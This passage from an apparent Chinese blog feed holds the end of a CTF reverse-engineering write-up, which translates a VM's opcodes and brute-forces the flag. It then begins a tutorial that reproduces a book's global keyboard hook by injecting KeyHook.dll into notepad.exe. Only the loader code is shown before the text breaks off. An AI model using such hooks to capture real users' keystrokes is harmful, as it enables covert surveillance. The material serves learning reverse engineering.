102, 240, 16, 248, 244, 44, 1, 11, 244<br>,21504124, 243, 242, 21504381, 254, 102, 240, 16, 248<br>,244, 11, 1, 22, 244, 22635920, 243, 242, 22635950, 254<br>,102, 240, 16, 248, 244, 22, 1, 33, 244, 23767716, 243<br>,242, 23767992, 254, 102, 240, 16, 248, 244, 33, 1, 44<br>,244, 24899512, 243, 242, 24899631, 254, 102, 240, 16<br>,248, 244, 44, 1, 11, 244, 26031308, 243, 242, 26031402<br>,254, 102, 240, 16, 248, 244, 11, 1, 22, 244, 27163104<br>,243, 242, 27163367, 254, 102, 240, 16, 248, 244, 22<br>,1, 33, 244, 28294900, 243, 242, 28294937, 254, 102<br>,240, 16, 248, 244, 33, 1, 44, 244, 29426696, 243, 242<br>,29426748, 254, 102, 240, 16, 248, 244, 44, 1, 11, 244<br>,30558492, 243, 242, 30558628, 254, 102, 240, 16, 248<br>,244, 11, 1, 22, 244, 31690288, 243, 242, 31690302, 254<br>,102, 240, 16, 248, 244, 22, 1, 33, 244, 32822084, 243<br>,242, 32822192, 254, 102, 240, 16, 248, 244, 33, 1, 44<br>,244, 33953880, 243, 242, 33953875, 254, 102, 240, 16<br>,248, 244, 44, 1, 11, 244, 35085676, 243, 242, 35085942<br>,254, 102, 240, 16, 248, 244, 11, 1, 22, 244, 36217472<br>,243, 242, 36217409, 254, 102, 240, 16, 248, 244, 22<br>,1, 33, 244, 37349268, 243, 242, 37349478, 254, 102<br>,240, 16, 248, 244, 33, 1, 44, 244, 38481064, 243, 242<br>,38481281, 254, 102, 240, 16, 248, 244, 44, 1, 11, 244<br>,39612860, 243, 242, 39613168, 254, 102, 240, 16, 248<br>,244, 11, 1, 22, 244, 40744656, 243, 242, 40744760, 254<br>,102, 240, 16, 248, 244, 22, 1, 33, 244, 41876452, 243<br>,242, 41876732, 254, 102, 240, 16, 248, 244, 33, 1, 44<br>,244, 43008248, 243, 242, 43008497, 254, 102, 240, 16<br>,248, 244, 44, 1, 11, 244, 44140044, 243, 242, 44140263<br>,254, 102, 240, 16, 248, 244, 11, 1, 22, 244, 45271840<br>,243, 242, 45272035, 254, 102, 240, 16, 248, 244, 22<br>,1, 33, 244, 46403636, 243, 242, 46403677, 254, 102<br>,240, 16, 248, 244, 33, 1, 44, 244, 47535432, 243, 242<br>,47535509, 254, 102, 240, 16, 248, 244, 44, 1, 11, 244<br>,48667228, 243, 242, 48667259, 254, 102, 240, 0<br>&#125;;<br></code></pre></td></tr></table></figure><p>翻译脚本(这个把ida复制过来稍微改一改就行)</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">trans</span><span class="hljs-params">()</span></span>&#123;<br>    <span class="hljs-type">int</span>* op = instrction;<br>    <span class="hljs-keyword">while</span>(*op)&#123;<br>        NEXT:<br>            <br>            <br>            <span class="hljs-type">int</span> v11 = *op;<br>            <span class="hljs-type">int</span> i;<br>            <span class="hljs-keyword">switch</span>(--v11)&#123;<br>                <span class="hljs-keyword">case</span> <span class="hljs-number">0</span>:<br>                    i = *(op + <span class="hljs-number">1</span>);<br>                    <br>                    <br>                    cout &lt;&lt; <span class="hljs-string">&quot;add v6 &quot;</span> &lt;&lt; i &lt;&lt; endl;<br>                    op += <span class="hljs-number">2</span>;<br>                    <span class="hljs-keyword">break</span>;<br>                <span class="hljs-keyword">case</span> <span class="hljs-number">15</span>:<br>                   <br>                    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;push gatchar()&quot;</span>);<br>                    op += <span class="hljs-number">1</span>;<br>                    <span class="hljs-keyword">break</span>;<br>                <span class="hljs-keyword">case</span> <span class="hljs-number">16</span>:<br>                    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;printf()&quot;</span>);<br>                    op += <span class="hljs-number">1</span>;<br>                    <span class="hljs-keyword">break</span>;<br>                <span class="hljs-keyword">case</span> <span class="hljs-number">239</span>:<br>                    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;mov v5 v6&quot;</span>);<br>                    op += <span class="hljs-number">1</span>;<br>                    <span class="hljs-keyword">break</span>;<br>                <span class="hljs-keyword">case</span> <span class="hljs-number">240</span>:<br>                    <br>                    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;mov v8 v6&quot;</span>);<br>                    op += <span class="hljs-number">1</span>;<br>                    <span class="hljs-keyword">break</span>;<br>                <span class="hljs-keyword">case</span> <span class="hljs-number">241</span>:<br>                    <br>                    <br>                    i = *(op + <span class="hljs-number">1</span>);<br>                    <br>                    <br>                    cout &lt;&lt; <span class="hljs-string">&quot;cmp v5 &quot;</span> &lt;&lt; i &lt;&lt; endl;<br>                    op += <span class="hljs-number">2</span>;<br>                    <span class="hljs-keyword">break</span>;<br>                <span class="hljs-keyword">case</span> <span class="hljs-number">242</span>:<br>                    <br>                    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;xor v5 v6&quot;</span>);<br>                    op += <span class="hljs-number">1</span>;<br>                    <span class="hljs-keyword">break</span>;<br>                <span class="hljs-keyword">case</span> <span class="hljs-number">243</span>:<br>                    <br>                    <br>                    <br>                    <br>                    <br>                    cout &lt;&lt; <span class="hljs-string">&quot;add v5 &quot;</span> &lt;&lt; *(op + <span class="hljs-number">1</span>)&lt;&lt; endl;<br>                    op += <span class="hljs-number">2</span>;<br>                    <span class="hljs-keyword">break</span>;<br>                <span class="hljs-keyword">case</span> <span class="hljs-number">244</span>:<br>                    <br>                    <br>                    cout &lt;&lt; <span class="hljs-string">&quot;add v5 &quot;</span> &lt;&lt; *(op + <span class="hljs-number">1</span>)  &lt;&lt; *(op+<span class="hljs-number">2</span>) &lt;&lt;endl;<br>                    op += <span class="hljs-number">12</span>;<br>                    <span class="hljs-keyword">break</span>;<br>                <span class="hljs-keyword">case</span> <span class="hljs-number">245</span>:<br>                    <br>                    <br>                    cout &lt;&lt; <span class="hljs-string">&quot;push&quot;</span> &lt;&lt; *(op + <span class="hljs-number">1</span>)&lt;&lt; endl;<br>                    op += <span class="hljs-number">2</span>;<br>                    <span class="hljs-keyword">break</span>;<br>                <span class="hljs-keyword">case</span> <span class="hljs-number">246</span>:<br>                    <br>                    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;pop v5&quot;</span>);<br>                    op += <span class="hljs-number">1</span>;<br>                    <span class="hljs-keyword">break</span>;<br>                <span class="hljs-keyword">case</span> <span class="hljs-number">247</span>:<br>                    <br>                    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;pop v6&quot;</span>);<br>                    op += <span class="hljs-number">1</span>;<br>                    <span class="hljs-keyword">break</span>;<br>                <span class="hljs-keyword">case</span> <span class="hljs-number">248</span>:<br>                    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;pop v7&quot;</span>);<br>                    op += <span class="hljs-number">1</span>;<br>                    <span class="hljs-keyword">break</span>;<br>                <span class="hljs-keyword">case</span> <span class="hljs-number">249</span>:<br>                    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;pop v8&quot;</span>);<br>                    op += <span class="hljs-number">1</span>;<br>                    <span class="hljs-keyword">break</span>;<br>                <span class="hljs-keyword">case</span> <span class="hljs-number">253</span>:<br>                    <br>                    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;big启动&quot;</span>);<br>                    op += <span class="hljs-number">2</span>;<br>                    <span class="hljs-keyword">break</span>;<br>                <span class="hljs-keyword">case</span> <span class="hljs-number">254</span>:<br>                    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;je op+ $0&quot;</span>);<br>                    <br>                    op += <span class="hljs-number">2</span>;<br>                    <span class="hljs-keyword">break</span>;<br>                <span class="hljs-keyword">default</span>:<br>                    <span class="hljs-keyword">goto</span> NEXT;<br>            &#125;<br><br>    &#125;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span>&#123;<br>    <span class="hljs-built_in">trans</span>();<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>提取出来的汇编<br>前面一大堆push和pop不用管<br>除了前两个字符不太一样，后面的都是一样的</p><figure class="highlight armasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs armasm"><span class="hljs-keyword">push</span> gatchar()<br><span class="hljs-keyword">push</span> gatchar()<br><span class="hljs-keyword">pop</span> <span class="hljs-built_in">v6</span><br><span class="hljs-keyword">pop</span> <span class="hljs-built_in">v5</span><br><span class="hljs-keyword">add</span> <span class="hljs-built_in">v5</span> <span class="hljs-number">1766746445</span><br><span class="hljs-keyword">add</span> <span class="hljs-built_in">v6</span> <span class="hljs-number">1952656716</span><br><span class="hljs-keyword">add</span> <span class="hljs-built_in">v5</span> <span class="hljs-number">0</span><br><span class="hljs-symbol">xor</span> <span class="hljs-built_in">v5</span> <span class="hljs-built_in">v6</span><br><span class="hljs-keyword">cmp</span> <span class="hljs-built_in">v5</span> <span class="hljs-number">489505807</span><br><span class="hljs-symbol">big</span>启动<br><br><span class="hljs-keyword">mov</span> <span class="hljs-built_in">v5</span> <span class="hljs-built_in">v6</span><br><span class="hljs-keyword">push</span> gatchar()<br><span class="hljs-keyword">pop</span> <span class="hljs-built_in">v6</span><br><span class="hljs-keyword">add</span> <span class="hljs-built_in">v5</span> <span class="hljs-number">22</span><br><span class="hljs-keyword">add</span> <span class="hljs-built_in">v6</span> <span class="hljs-number">33</span><br><span class="hljs-keyword">add</span> <span class="hljs-built_in">v5</span> <span class="hljs-number">1131796</span><br><span class="hljs-symbol">xor</span> <span class="hljs-built_in">v5</span> <span class="hljs-built_in">v6</span><br><span class="hljs-keyword">cmp</span> <span class="hljs-built_in">v5</span> <span class="hljs-number">1953788496</span><br><span class="hljs-symbol">big</span>启动<br></code></pre></td></tr></table></figure><p>可以先用‘m’ 和 ‘i’ 验证一下，然后把数据提取出来爆破就行。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-comment">/*</span><br><span class="hljs-comment">add v5 1766746445</span><br><span class="hljs-comment">add v6 1952656716</span><br><span class="hljs-comment">add v5 0</span><br><span class="hljs-comment">xor v5 v6</span><br><span class="hljs-comment">cmp v5 489505807</span><br><span class="hljs-comment">big启动</span><br><span class="hljs-comment">*/</span><br><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;iostream&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;vector&gt;</span></span><br><br><span class="hljs-keyword">using</span> <span class="hljs-keyword">namespace</span> std;<br><br>vector&lt;vector&lt;<span class="hljs-type">int</span>&gt;&gt; data_ = &#123;<br>         &#123;<span class="hljs-number">22</span>, <span class="hljs-number">33</span>, <span class="hljs-number">1131796</span>, <span class="hljs-number">1953788496</span>&#125;,<br>        &#123;<span class="hljs-number">33</span>, <span class="hljs-number">44</span>, <span class="hljs-number">2263592</span>, <span class="hljs-number">2263629</span>&#125;,<br>        &#123;<span class="hljs-number">44</span>, <span class="hljs-number">11</span>, <span class="hljs-number">3395388</span>, <span class="hljs-number">3395498</span>&#125;,<br>        &#123;<span class="hljs-number">11</span>, <span class="hljs-number">22</span>, <span class="hljs-number">4527184</span>, <span class="hljs-number">4527307</span>&#125;,<br>        &#123;<span class="hljs-number">22</span>, <span class="hljs-number">33</span>, <span class="hljs-number">5658980</span>, <span class="hljs-number">5658982</span>&#125;,<br>        &#123;<span class="hljs-number">33</span>, <span class="hljs-number">44</span>, <span class="hljs-number">6790776</span>, <span class="hljs-number">6791100</span>&#125;,<br>        &#123;<span class="hljs-number">44</span>, <span class="hljs-number">11</span>, <span class="hljs-number">7922572</span>, <span class="hljs-number">7922892</span>&#125;,<br>        &#123;<span class="hljs-number">11</span>, <span class="hljs-number">22</span>, <span class="hljs-number">9054368</span>, <span class="hljs-number">9054537</span>&#125;,<br>        &#123;<span class="hljs-number">22</span>, <span class="hljs-number">33</span>, <span class="hljs-number">10186164</span>, <span class="hljs-number">10186440</span>&#125;,<br>        &#123;<span class="hljs-number">33</span>, <span class="hljs-number">44</span>, <span class="hljs-number">11317960</span>, <span class="hljs-number">11318240</span>&#125;,<br>        &#123;<span class="hljs-number">44</span>, <span class="hljs-number">11</span>, <span class="hljs-number">12449756</span>, <span class="hljs-number">12450038</span>&#125;,<br>        &#123;<span class="hljs-number">11</span>, <span class="hljs-number">22</span>, <span class="hljs-number">13581552</span>, <span class="hljs-number">13581602</span>&#125;,<br>        &#123;<span class="hljs-number">22</span>, <span class="hljs-number">33</span>, <span class="hljs-number">14713348</span>, <span class="hljs-number">14713579</span>&#125;,<br>        &#123;<span class="hljs-number">33</span>, <span class="hljs-number">44</span>, <span class="hljs-number">15845144</span>, <span class="hljs-number">15845189</span>&#125;,<br>        &#123;<span class="hljs-number">44</span>, <span class="hljs-number">11</span>, <span class="hljs-number">16976940</span>, <span class="hljs-number">16977052</span>&#125;,<br>        &#123;<span class="hljs-number">11</span>, <span class="hljs-number">22</span>, <span class="hljs-number">18108736</span>, <span class="hljs-number">18108814</span>&#125;,<br>        &#123;<span class="hljs-number">22</span>, <span class="hljs-number">33</span>, <span class="hljs-number">19240532</span>, <span class="hljs-number">19240500</span>&#125;,<br>        &#123;<span class="hljs-number">33</span>, <span class="hljs-number">44</span>, <span class="hljs-number">20372328</span>, <span class="hljs-number">20372636</span>&#125;,<br>        &#123;<span class="hljs-number">44</span>, <span class="hljs-number">11</span>, <span class="hljs-number">21504124</span>, <span class="hljs-number">21504381</span>&#125;,<br>        &#123;<span class="hljs-number">11</span>, <span class="hljs-number">22</span>, <span class="hljs-number">22635920</span>, <span class="hljs-number">22635950</span>&#125;,<br>        &#123;<span class="hljs-number">22</span>, <span class="hljs-number">33</span>, <span class="hljs-number">23767716</span>, <span class="hljs-number">23767992</span>&#125;,<br>        &#123;<span class="hljs-number">33</span>, <span class="hljs-number">44</span>, <span class="hljs-number">24899512</span>, <span class="hljs-number">24899631</span>&#125;,<br>        &#123;<span class="hljs-number">44</span>, <span class="hljs-number">11</span>, <span class="hljs-number">26031308</span>, <span class="hljs-number">26031402</span>&#125;,<br>        &#123;<span class="hljs-number">11</span>, <span class="hljs-number">22</span>, <span class="hljs-number">27163104</span>, <span class="hljs-number">27163367</span>&#125;,<br>        &#123;<span class="hljs-number">22</span>, <span class="hljs-number">33</span>, <span class="hljs-number">28294900</span>, <span class="hljs-number">28294937</span>&#125;,<br>        &#123;<span class="hljs-number">33</span>, <span class="hljs-number">44</span>, <span class="hljs-number">29426696</span>, <span class="hljs-number">29426748</span>&#125;,<br>        &#123;<span class="hljs-number">44</span>, <span class="hljs-number">11</span>, <span class="hljs-number">30558492</span>, <span class="hljs-number">30558628</span>&#125;,<br>        &#123;<span class="hljs-number">11</span>, <span class="hljs-number">22</span>, <span class="hljs-number">31690288</span>, <span class="hljs-number">31690302</span>&#125;,<br>        &#123;<span class="hljs-number">22</span>, <span class="hljs-number">33</span>, <span class="hljs-number">32822084</span>, <span class="hljs-number">32822192</span>&#125;,<br>        &#123;<span class="hljs-number">33</span>, <span class="hljs-number">44</span>, <span class="hljs-number">33953880</span>, <span class="hljs-number">33953875</span>&#125;,<br>        &#123;<span class="hljs-number">44</span>, <span class="hljs-number">11</span>, <span class="hljs-number">35085676</span>, <span class="hljs-number">35085942</span>&#125;,<br>        &#123;<span class="hljs-number">11</span>, <span class="hljs-number">22</span>, <span class="hljs-number">36217472</span>, <span class="hljs-number">36217409</span>&#125;,<br>        &#123;<span class="hljs-number">22</span>, <span class="hljs-number">33</span>, <span class="hljs-number">37349268</span>, <span class="hljs-number">37349478</span>&#125;,<br>        &#123;<span class="hljs-number">33</span>, <span class="hljs-number">44</span>, <span class="hljs-number">38481064</span>, <span class="hljs-number">38481281</span>&#125;,<br>        &#123;<span class="hljs-number">44</span>, <span class="hljs-number">11</span>, <span class="hljs-number">39612860</span>, <span class="hljs-number">39613168</span>&#125;,<br>        &#123;<span class="hljs-number">11</span>, <span class="hljs-number">22</span>, <span class="hljs-number">40744656</span>, <span class="hljs-number">40744760</span>&#125;,<br>        &#123;<span class="hljs-number">22</span>, <span class="hljs-number">33</span>, <span class="hljs-number">41876452</span>, <span class="hljs-number">41876732</span>&#125;,<br>        &#123;<span class="hljs-number">33</span>, <span class="hljs-number">44</span>, <span class="hljs-number">43008248</span>, <span class="hljs-number">43008497</span>&#125;,<br>        &#123;<span class="hljs-number">44</span>, <span class="hljs-number">11</span>, <span class="hljs-number">44140044</span>, <span class="hljs-number">44140263</span>&#125;,<br>        &#123;<span class="hljs-number">11</span>, <span class="hljs-number">22</span>, <span class="hljs-number">45271840</span>, <span class="hljs-number">45272035</span>&#125;,<br>        &#123;<span class="hljs-number">22</span>, <span class="hljs-number">33</span>, <span class="hljs-number">46403636</span>, <span class="hljs-number">46403677</span>&#125;,<br>        &#123;<span class="hljs-number">33</span>, <span class="hljs-number">44</span>, <span class="hljs-number">47535432</span>, <span class="hljs-number">47535509</span>&#125;,<br>        &#123;<span class="hljs-number">44</span>, <span class="hljs-number">11</span>, <span class="hljs-number">48667228</span>, <span class="hljs-number">48667259</span>&#125;<br>    &#125;;<br><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-type">int</span> v5;<br>    <span class="hljs-type">int</span> v6;<br>     v5 = <span class="hljs-string">&#x27;m&#x27;</span>;<br>     v6 = <span class="hljs-string">&#x27;i&#x27;</span>;<br>     <br>     v5 += <span class="hljs-number">1766746445</span>;<br>     v6 += <span class="hljs-number">1952656716</span>;<br>   <br>    v5 = v5 ^ v6;<br>    v5 = v6;<br><br>    cout &lt;&lt; <span class="hljs-string">&quot;mi&quot;</span>;<br><br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; data_.<span class="hljs-built_in">size</span>(); i++)&#123;<br><br>        <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> j = <span class="hljs-number">33</span>;j &lt;<span class="hljs-number">127</span>;j++)&#123;<br>            v6 = j;<br>            <span class="hljs-type">int</span> v5_temp = v5;<br>            v5_temp += data_[i][<span class="hljs-number">0</span>];<br>            v6 += data_[i][<span class="hljs-number">1</span>];<br>            v5_temp += data_[i][<span class="hljs-number">2</span>];<br>            <span class="hljs-keyword">if</span>((v5_temp ^ v6) == data_[i][<span class="hljs-number">3</span>])&#123;<br>                cout &lt;&lt; <span class="hljs-built_in">char</span>(j) ; <br>                v5 = v6;<br>                <span class="hljs-keyword">break</span>;<br>            &#125;<br>            <br>        &#125;<br>        <br><br>    &#125;<br>    <br>    <br><br>&#125;<br></code></pre></td></tr></table></figure><h3 id="剩下的题目之后再写"><a href="#剩下的题目之后再写" class="headerlink" title="剩下的题目之后再写"></a>剩下的题目之后再写</h3>]]></content>
    
    
    <categories>
      
      <category>RE</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>复现KeyHook</title>
    <link href="/2024/05/16/%E5%A4%8D%E7%8E%B0KeyHook/"/>
    <url>/2024/05/16/%E5%A4%8D%E7%8E%B0KeyHook/</url>
    
    <content type="html"><![CDATA[<h1 id="复现《逆向工程核心原理》Hook"><a href="#复现《逆向工程核心原理》Hook" class="headerlink" title="复现《逆向工程核心原理》Hook"></a>复现《逆向工程核心原理》Hook</h1><h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>利用Hook，我们可以查看，修改，截断 ‘用户-os-应用程序’ 之间所有的信息<br><img src="/../res/3.1.png" alt="示意图"></p><p>接下来以keyBoard为例，实际操作一下，目的是<strong>向notepad.exe中注入KeyHook.dll实现键盘输入的钩取,并且改写成全局钩子，显示获取到的key</strong></p><h2 id="函数总览"><a href="#函数总览" class="headerlink" title="函数总览"></a>函数总览</h2><h3 id="main"><a href="#main" class="headerlink" title="main"></a>main</h3><p>HookMain.cpp &#x2F;&#x2F;注入函数</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&quot;stdio.h&quot;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&quot;Windows.h&quot;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&quot;conio.h&quot;</span></span><br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> DLL_NAME <span class="hljs-string">&quot;KeyHook.dll&quot;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> HOOKSTART <span class="hljs-string">&quot;HookStart&quot;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> HOOKSTOP <span class="hljs-string">&quot;HookStop&quot;</span></span><br><br><span class="hljs-function"><span class="hljs-keyword">typedef</span> <span class="hljs-title">void</span><span class="hljs-params">(*FN_HOOKSTART)</span><span class="hljs-params">()</span></span>;<br><span class="hljs-function"><span class="hljs-keyword">typedef</span> <span class="hljs-title">void</span><span class="hljs-params">(*FN_HOOKSTOP)</span><span class="hljs-params">()</span></span>;<br><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>    HMODULE hDll = <span class="hljs-literal">NULL</span>;<br>    FN_HOOKSTART HookStart = <span class="hljs-literal">NULL</span>;<br>    FN_HOOKSTOP HookStop = <span class="hljs-literal">NULL</span>;<br><br>    hDll = <span class="hljs-built_in">LoadLibraryA</span>(DLL_NAME);<br><br>    HookStart = (FN_HOOKSTART)<span class="hljs-built_in">GetProcAddress</span>(hDll, HOOKSTART);<br>    HookStop = (FN_HOOKSTOP)<span class="hljs-built_in">GetProcAddress</span>(hDll, HOOKSTOP);<br><br>    <span class="hljs-built_in">HookStart</span>();<br><br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;press &#x27;q&#x27; to quit this hook procdure&quot;</span>);<br>    <span class="hljs-keyword">while</span> (_getch() != <span class="hljs-string">&#x27;q&#x27;</span>);<br><br>    <span class="hljs-built_in">HookStop</span>();<br><br>    <span class="hljs-built_in">FreeLibrary</span>(hDll);<br><br>    <span class="hljs-keyword">return</span> <span class="hljs-number">1</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="dll"><a href="#dll" class="headerlink" title="dll"></a>dll</h3><p>KeyHook.cpp   &#x2F;&#x2F;dll实现函数</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span 